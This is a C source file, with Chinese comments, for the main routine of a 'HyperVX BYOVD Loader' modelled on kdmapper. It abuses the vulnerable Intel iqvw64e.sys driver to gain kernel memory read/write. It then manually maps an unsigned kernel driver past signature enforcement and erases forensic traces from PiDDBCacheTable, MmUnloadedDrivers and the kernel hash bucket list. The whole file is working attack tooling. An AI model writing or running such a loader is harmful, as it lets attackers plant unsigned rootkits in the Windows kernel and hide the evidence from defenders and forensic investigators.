#include "intel_driver.h"
#include "pe_mapper.h"
#include <stdio.h>

/* ================================================================== */
/*  KdMapper - BYOVD 手动映射加载器                                   */
/*                                                                    */
/*  使用 iqvw64e.sys (Intel 网卡诊断驱动) 漏洞获取内核读写能力，       */
/*  将未签名的 .sys 驱动手动映射到内核内存并调用 DriverEntry。          */
/*  加载完成后清理 PiDDBCacheTable / MmUnloadedDrivers /               */
/*  g_KernelHashBucketList 反取证痕迹。                                */
/*                                                                    */
/*  参考: https://github.com/TheCruZ/kdmapper                        */
/* ================================================================== */

/* ------------------------------------------------------------------ */
/*  管理员权限检查                                                    */
/* ------------------------------------------------------------------ */

static BOOL
IsRunningAsAdmin(void)
{
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID adminGroup = NULL;

    if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

/* ------------------------------------------------------------------ */
/*  获取 iqvw64e.sys 路径 (与 loader 同目录)                          */
/* ------------------------------------------------------------------ */

static BOOL
GetVulnDriverPath(WCHAR *OutPath, DWORD MaxChars)
{
    GetModuleFileNameW(NULL, OutPath, MaxChars);

    /* 截断到目录部分 */
    WCHAR *slash = wcsrchr(OutPath, L'\\');
    if (slash) *(slash + 1) = L'\0';
    wcscat_s(OutPath, MaxChars, INTEL_DRIVER_FILE_NAME);

    return GetFileAttributesW(OutPath) != INVALID_FILE_ATTRIBUTES;
}

/* ------------------------------------------------------------------ */
/*  打印使用说明                                                      */
/* ------------------------------------------------------------------ */

static void
PrintUsage(LPCWSTR ExeName)
{
    printf("=== HyperVX BYOVD Loader ===\n");
    printf("用法: %ls <driver.sys> [iqvw64e.sys 路径]\n\n", ExeName);
    printf("参数:\n");
    printf("  driver.sys       要映射的内核驱动 (.sys) 路径\n");
    printf("  iqvw64e.sys      Intel 漏洞驱动路径 (可选，默认与 loader 同目录)\n\n");
    printf("注意:\n");
    printf("  - 必须以管理员身份运行\n");
    printf("  - 需要关闭 Secure Boot\n");
    printf("  - 需要开启测试签名或 DSE 禁用\n");
}

/* ------------------------------------------------------------------ */
/*  主函数                                                            */
/* ------------------------------------------------------------------ */

int wmain(int argc, WCHAR *argv[])
{
    int exitCode = 1;

    printf("===========================================\n");
    printf("  HyperVX BYOVD Loader v1.0\n");
    printf("  Phase 2: Manual Kernel Driver Mapping\n");
    printf("===========================================\n\n");

    /* 参数检查 */
    if (argc < 2) {
        PrintUsage(argc > 0 ? argv[0] : L"kdmapper");
        return 1;
    }

    LPCWSTR targetDriver = argv[1];

    /* 管理员权限检查 */
    if (!IsRunningAsAdmin()) {
        printf("[-] 需要管理员权限运行\n");
        return 1;
    }
    printf("[+] 管理员权限确认\n");

    /* 验证目标驱动文件 */
    if (GetFileAttributesW(targetDriver) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] 找不到目标驱动: %ls\n", targetDriver);
        return 1;
    }
    printf("[+] 目标驱动: %ls\n", targetDriver);

    /* 定位漏洞驱动 */
    WCHAR vulnPath[MAX_PATH];
    if (argc >= 3) {
        wcscpy_s(vulnPath, MAX_PATH, argv[2]);
    } else if (!GetVulnDriverPath(vulnPath, MAX_PATH)) {
        printf("[-] 找不到 iqvw64e.sys，请将其放到 loader 同目录或指定路径\n");
        return 1;
    }
    printf("[+] 漏洞驱动: %ls\n\n", vulnPath);

    /* ============================================================== */
    /*  Step 1: 加载漏洞驱动                                          */
    /* ============================================================== */
    printf("[*] Step 1/5: 加载 iqvw64e.sys...\n");
    if (!IntelLoadDriver(vulnPath)) {
        printf("[-] 加载漏洞驱动失败\n");
        goto done;
    }

    if (!IntelOpenDevice()) {
        printf("[-] 打开漏洞驱动设备失败\n");
        goto unload;
    }

    /* ============================================================== */
    /*  Step 2: 验证内核读写能力                                      */
    /* ============================================================== */
    printf("\n[*] Step 2/5: 验证内核访问...\n");
    ULONG64 ntBase = IntelGetKernelModuleBase("ntoskrnl.exe", NULL);
    if (!ntBase) {
        printf("[-] 无法获取 ntoskrnl 基址\n");
        goto unload;
    }
    printf("[+] ntoskrnl.exe @ 0x%llX\n", ntBase);

    /* 验证能读取内核 PE 头 */
    USHORT magic = 0;
    if (!IntelReadKernel(ntBase, &magic, 2) || magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] 内核内存读取验证失败\n");
        goto unload;
    }
    printf("[+] 内核读写能力已确认\n");

    /* ============================================================== */
    /*  Step 3: 手动映射目标驱动                                      */
    /* ============================================================== */
    printf("\n[*] Step 3/5: 手动映射驱动...\n");
    if (!MapDriverToKernel(targetDriver)) {
        printf("[-] 驱动映射失败\n");
        goto unload;
    }

    /* ============================================================== */
    /*  Step 4: 清理反取证痕迹                                        */
    /* ============================================================== */
    printf("\n[*] Step 4/5: 清理痕迹...\n");
    CleanAllTraces();

    /* ============================================================== */
    /*  Step 5: 卸载漏洞驱动                                          */
    /* ============================================================== */
    printf("\n[*] Step 5/5: 卸载漏洞驱动...\n");
    exitCode = 0;

unload:
    IntelUnloadDriver();

    /* 删除漏洞驱动文件 (可选) */
    /* DeleteFileW(vulnPath); */

done:
    printf("\n===========================================\n");
    if (exitCode == 0)
        printf("  [+] 驱动加载成功!\n");
    else
        printf("  [-] 驱动加载失败\n");
    printf("===========================================\n");

    return exitCode;
}
